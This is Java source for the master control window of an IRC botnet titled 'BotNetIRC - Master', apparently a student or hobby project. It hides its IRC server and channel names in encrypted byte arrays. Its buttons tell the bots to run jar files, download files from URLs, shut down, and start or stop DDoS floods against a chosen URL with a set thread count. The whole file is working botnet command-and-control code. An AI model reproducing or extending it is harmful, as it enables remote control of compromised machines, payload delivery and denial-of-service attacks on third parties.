package mastergui;

import crypto.Crypto;

import javax.swing.*;
import java.awt.event.*;

import static botlogic.Bot.closeSocketConnection;

/**
 * Created by zychp_w10 on 08.05.2017.
 */
public class Gui {
    private static Crypto crypto = new Crypto();

    private static byte[] encryptedServerName =
            new byte[] { 66, -81, 0, -113, 12, 21, -51, -5, -79, 79, 51, -120, 15, -44, 22, -57 };
    private static byte[] encryptedChannelName =
            new byte[] { 43, -48, 64, -7, -20, -47, 19, -73, -32, -30, -33, 56, -76, -12, -33, -78 };

    private static String server = crypto.decrypt(encryptedServerName);
    private static String nick = "masterGui";
    private static String login = "masterGui";
    private static String channel = crypto.decrypt(encryptedChannelName);

    private Master masterbot;

    private JPanel mainPanel;
    private JTextField commandTextField1;
    private JButton sendButton;
    private JTextArea logTextArea1;
    private JPanel logPanel;
    private JPanel buttonPanel;
    private JScrollPane logScrollPane;
    private JCheckBox cleanchatCheckBox;
    private JButton connectionTestButton;
    private JButton runJarFileButton;
    private JButton downloadFileFromUrlButton;
    private JButton killBotButton;
    private JButton helpButton;
    private JButton ddosstartButton;
    private JButton ddosstopButton;

    public Gui() throws Exception {
        masterbot = new Master(server, nick, login, channel);
        masterbot.connectToIRC();
        logTextArea1.setEditable(false);
        JScrollBar vertical = logScrollPane.getVerticalScrollBar();
        cleanchatCheckBox.setSelected(false);
        Timer timer = new Timer(100, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    String line = masterbot.receiveMessageForMastergui(cleanchatCheckBox.isSelected());
                    if (!(line.isEmpty())) {
                        logTextArea1.append(line + "\n");
                        vertical.setValue(vertical.getMaximum());
                    }
                } catch (Exception exc) {
                }
            }
        });
        timer.start();
        sendButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String command;
                command = commandTextField1.getText();
                commandTextField1.setText(command);
                logTextArea1.append(command + "\n");
                vertical.setValue(vertical.getMaximum());
                try {
                    masterbot.sendMessage(command);
                } catch (java.lang.Exception exc) {
                    logTextArea1.append("Can't send message!\n");
                }
            }
        });
        commandTextField1.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                super.keyPressed(e);
                if(e.getKeyCode() == KeyEvent.VK_ENTER)
                    sendButton.doClick();
            }
        });
        connectionTestButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("TESTINOUT");
            }
        });
        runJarFileButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("RUNJAR");
                RunJarFileGui dialog = new RunJarFileGui();
                dialog.setTitle("Run Jar File");
                dialog.setSize(600, 150);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
                commandTextField1.setText("RUNJAR " + dialog.getJarfilepath());
            }
        });
        downloadFileFromUrlButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("DOWNLOADFILE");
                DownloadFileFromUrlGui dialog = new DownloadFileFromUrlGui();
                dialog.setTitle("Download File");
                dialog.setSize(600, 200);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
                commandTextField1.setText("DOWNLOADFILE " + dialog.getFilepath() + " " + dialog.getUrl());
            }
        });
        killBotButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("DIE");
            }
        });
        helpButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HelpGui dialog = new HelpGui();
                dialog.setTitle("Help");
                dialog.pack();
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
            }
        });
        ddosstartButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                DdosGui dialog = new DdosGui();
                dialog.setTitle("DDos");
                dialog.setSize(600, 200);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
                commandTextField1.setText("STARTDDOSURL " + dialog.getUrl() + " " + dialog.getNumOfThreads());
            }
        });
        ddosstopButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("STOPDDOSURL ");
            }
        });
    }

    public static void main(String[] args) throws Exception {
        JFrame frame = new JFrame("Gui");
        frame.setSize(800, 500);
        frame.setLocationByPlatform(true);
        frame.setTitle("BotNetIRC - Master");
        frame.setContentPane(new Gui().mainPanel);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent evt) {
                closeSocketConnection();
                System.exit(0);
            }
        });
        frame.setVisible(true);
     }
}
